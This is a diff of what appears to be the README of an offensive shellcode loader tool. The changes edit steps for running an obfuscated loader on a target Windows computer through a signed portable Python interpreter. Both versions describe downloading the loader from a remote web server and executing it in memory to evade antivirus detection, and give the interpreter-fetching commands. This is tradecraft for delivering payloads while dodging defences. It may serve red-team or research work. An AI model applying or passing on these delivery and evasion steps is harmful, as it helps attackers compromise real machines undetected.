@@ -22,12 +22,12 @@ C:\path\python-3.10.4> python.exe .\Invoke-Python-ShellCodeLoader.py ".\raw-shel
 
 - STEP 2. Multiple options exist to download & execute the obfuscated shellcode loader (Python script) on a target Windows computer
 
-  - Option A: Utilize a portable signed Python interpreter (www.python.org) + Fileless delivery of the obfuscated shellcode loader (Python script) 
+  - Option A: Utilize a portable signed Python 3 interpreter (www.python.org) + Fileless delivery of the obfuscated shellcode loader (Python script) 
 ```
-1 - Download the Python embeddable package (www.python.org) which provides a signed (portable) Python interpreter with a good reputation.
+1 - Download a signed portable Python 3 interpreter from 'www.python.org'.
     Example:
-    PS C:\temp> wget -uri https://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip -OutFile C:\temp\python.zip
-    PS C:\temp> tar -xf .\python.zip
+    PS C:\temp\python> wget -uri https://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip -OutFile C:\temp\python\python.zip
+    PS C:\temp\python> tar -xf .\python.zip; del .\python.zip;
 
 2 - Download from a remote web server and execute directly in memory the obfuscated shellcode loader script on the target Windows machine using Python.
     This fileless delivery technique enhances stealth and helps evade static antivirus detection.
@@ -43,12 +43,12 @@ C:\path\python-3.10.4> python.exe .\Invoke-Python-ShellCodeLoader.py ".\raw-shel
 
     C:\temp\python> python.exe .\Python-fileless-delivery.py 
 ```
-  - Option B: Utilize a portable signed Python interpreter (www.python.org) + Download the obfuscated shellcode loader (Python script) locally before execution.
+  - Option B: Utilize a portable signed Python 3 interpreter (www.python.org) + Download the obfuscated shellcode loader (Python script) locally before execution.
 ```
-1 - Download the Python embeddable package (www.python.org) which provides a signed (portable) Python interpreter with a good reputation.
+1 - Download a signed portable Python 3 interpreter from 'www.python.org'.
     Example:
-    PS C:\temp> wget -uri https://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip -OutFile C:\temp\python.zip
-    PS C:\temp> tar -xf .\python.zip
+    PS C:\temp\python> wget -uri https://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip -OutFile C:\temp\python\python.zip
+    PS C:\temp\python> tar -xf .\python.zip; del .\python.zip;
 
 2 - Download and store the obfuscated shellcode loader script locally on disk before executing it with Python.
     While obfuscation and encryption help evade static analysis by most antivirus solutions, this approach may offer reduced stealth compared to in-memory execution.
